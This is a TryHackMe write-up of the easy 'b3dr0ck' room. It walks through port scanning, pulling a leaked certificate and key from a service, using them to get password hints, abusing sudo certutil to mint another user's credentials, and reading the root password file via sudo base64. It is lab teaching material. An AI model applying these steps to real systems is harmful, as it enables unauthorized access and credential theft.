---
title: "b3dr0ck"
date: 2025-02-13
image: /assets/img/Bedrock/Bedrock_image.jpg
description: Writeup of the TryHackMe-CTF b3dr0ck
categories: [Tryhackme, Easy]
tags: [linux, certificates, web, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>b3dr0ck</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Server trouble in Bedrock.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/b3dr0ck">https://tryhackme.com/room/b3dr0ck</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge b3dr0ck.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.58.21                                 
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 12:36 EST
  Nmap scan report for 10.10.58.21
  Host is up (0.047s latency).
  Not shown: 65530 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  4040/tcp  open  yo-main
  9009/tcp  open  pichat
  54321/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 25.49 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash

```
From here I proceeded the analysis port by port.

## Port 80 Analysis

Accessing port 80 with a web browser redirects me to port 4040 and showed me the following message:

```text
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

Because of the `OVER 9000` I continued with port `9009`.

## Port 9009 Analysis

The web server timed out, so I tried connecting using `telnet`. The following output has been shortened for better readability:

```bash
$ telnet 10.10.58.21 9009              
Trying 10.10.58.21...
Connected to 10.10.58.21.
Escape character is '^]'.


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? flag
Sorry, unrecognized request: 'flag'

You use this service to recover your client certificate and private key
What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
[reduced]
-----END RSA PRIVATE KEY-----

What are you looking for? public
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
[reduced]
-----END CERTIFICATE-----
```

I stored the certificates on my machine and continued with the last port.

## Port 54321 Analysis

The webserver gave me the following error message:
```text
Gave me: `Error: 'undefined' is not authorized for access.` Probably we need the cert?
```

That's interesting because we already received a certificate pair. I tried to connect to the server using `openssl` with success:
```bash
$ openssl s_client -connect 10.10.58.21:54321 -cert pubkey -key privkey
```
The output is quite long, so I reduced it for readability:
```bash
 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> flag
Unrecognized command: 'flag'

This service is for login and password hints
b3dr0ck> password hints 
Password hint: [removed] (user = 'Barney Rubble')
b3dr0ck> login
Login is disabled. Please use SSH instead.
```

After several attempts to crack the string, I decided to use it as a password and successfully connected via `ssh`. 

## Privilege Escalation Fred

Because I have a valid username and password pair I was able to execute `sudo -l`:

```bash
$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

There is likely a certificate stored for Fred:

```bash
barney@b3dr0ck:~$ cat /etc/passwd | grep fred
	fred:x:1000:1000:Fred Flintstone:/home/fred:/bin/bash
barney@b3dr0ck:~$ sudo certutil fred "Fred Flintstone"
  Generating credentials for user: fred (Fred Flintstone)
  Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
  Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[reduced]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[reduced]
-----END CERTIFICATE-----

```

Let's apply the same approach used for Barney's certificate:

```bash
$ openssl s_client -connect 10.10.58.21:54321 -cert pubkey2 -key privkey2
 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck> hint
Password hint: [removed] (user = 'Fred Flintstone')
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck>

$ ssh fred@10.10.58.21            
fred@10.10.58.21's password: 
fred@b3dr0ck:~$
fred@b3dr0ck:~$ cat fred.txt 
THM{[removed]}
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
red@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

I then proceeded to execute the `base64` command with sudo:

```base64
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt | base64 -d
[removed]
```

At this point, I used `CyberChef` and `Crackstation` to analyze the string:

![Root Password](/assets/img/tryhackme/Bedrock/thm_bedrock_1.jpg)

```base64
fred@b3dr0ck:~$ su root
	Password: 
root@b3dr0ck:/home/fred# cd /root
root@b3dr0ck:~# ls
	pass.txt  root.txt  snap
root@b3dr0ck:~# cat root.txt
THM{[removed]}
```

solved! :)
